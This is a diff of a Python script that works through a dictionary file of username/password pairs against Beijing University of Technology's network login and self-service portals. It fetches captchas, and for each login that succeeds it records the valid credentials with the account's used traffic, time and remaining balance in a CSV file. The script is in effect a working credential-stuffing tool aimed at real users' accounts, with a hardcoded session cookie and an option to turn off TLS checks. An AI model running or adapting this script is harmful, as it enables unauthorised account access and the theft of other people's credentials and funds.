@@ -17,7 +17,6 @@ fiddler_ssl = False
 test_cookie = 'JSESSIONID=F12C8E1CB3D6218C617B7ACA33189DDD'
 
 
-
 def is_success(html_res):
     class HtmlPar(HTMLParser):
         flg_title = False
@@ -68,11 +67,13 @@ def log_out(html_cookie, s):
     return
 
 
-def get_used_traffic():
+def get_used():
     class HtmlPar(HTMLParser):
         ct_script = 0
         flg_script = False
         used_data = ""
+        used_time = ""
+        remain_money = ""
 
         def handle_starttag(self, tag, attrs):
             if len(attrs) != 0 and len(attrs[0]) != 0:
@@ -85,9 +86,18 @@ def get_used_traffic():
 
         def handle_data(self, data):
             if HtmlPar.flg_script and HtmlPar.ct_script == 1:
+                # get used traffic
                 str_idx_s = data.index("';flow='") + 8
                 str_idx_e = data.index("';fsele=", str_idx_s)
                 HtmlPar.used_data = data[str_idx_s:str_idx_e].rstrip()
+                # get used time
+                str_idx_s = data.index("time='") + 6
+                str_idx_e = data.index("';flow='", str_idx_s)
+                HtmlPar.used_time = data[str_idx_s:str_idx_e].rstrip()
+                # get remaining money
+                str_idx_s = data.index(";fee='") + 6
+                str_idx_e = data.index("';xsele=", str_idx_s)
+                HtmlPar.remain_money = data[str_idx_s:str_idx_e].rstrip()
 
     html_url = "https://lgn.bjut.edu.cn/"
     try:
@@ -99,7 +109,7 @@ def get_used_traffic():
 
     html_par.feed(html_res.text)
 
-    return html_par.used_data
+    return html_par.used_data, html_par.used_time, html_par.remain_money
 
 
 def get_check_code(s):
@@ -131,8 +141,8 @@ def get_check_code(s):
     except:
         print("Failed to get session.")
         return -1
-    html_cookie=html_res.headers['Set-Cookie'].strip("; Path=/; HttpOnly")
-	
+    html_cookie = html_res.headers['Set-Cookie'].strip("; Path=/; HttpOnly")
+
     html_url = "https://jfself.bjut.edu.cn/nav_login"
     try:
         html_res = s.get(html_url, headers={'Connection': 'Keep-Alive', 'Cookie': html_cookie}, verify=not fiddler_ssl)
@@ -141,7 +151,7 @@ def get_check_code(s):
         return -1
     html_par = HtmlPar()
     html_par.feed(html_res.text)
-    
+
     html_url = "https://jfself.bjut.edu.cn/RandomCodeAction.action"
     try:
         html_res = s.get(html_url, headers={'Connection': 'Keep-Alive', 'Cookie': html_cookie}, verify=not fiddler_ssl)
@@ -199,7 +209,8 @@ def get_total_traffic(check_code, u_name, u_pass, html_cookie, s):
 if __name__ == '__main__':
     # open dict
     f_dic = open("dic.txt")
-    f_out = open("ok.txt", "w")
+    f_out = open("ok.csv", "w")
+    f_out.write('name,pass,used_data,total,used_time,remain_money\n')
     u_name = f_dic.readline().strip('\n')
     u_pass = f_dic.readline().strip('\n')
     while u_name != "" and u_pass != "":
@@ -230,11 +241,11 @@ if __name__ == '__main__':
             print("\tSuccess!")
             # get used traffic
             s = requests.Session()
-            u_used = get_used_traffic()
+            u_used_data, u_used_time, u_remain_money = get_used()
             check_code, html_cookie = get_check_code(s)
             # print(check_code, html_cookie)
             u_total = get_total_traffic(check_code, u_name, u_pass, html_cookie, s)
-            f_out.write(u_name + ',' + u_pass + ',' + u_used + ',' + u_total + '\n')
+            f_out.write(u_name + ',' + u_pass + ',' + u_used_data + ',' + u_total + ',' + u_used_time + ',' + u_remain_money + '\n')
             log_out(html_cookie, s)
         else:
             print("\tFailed.")
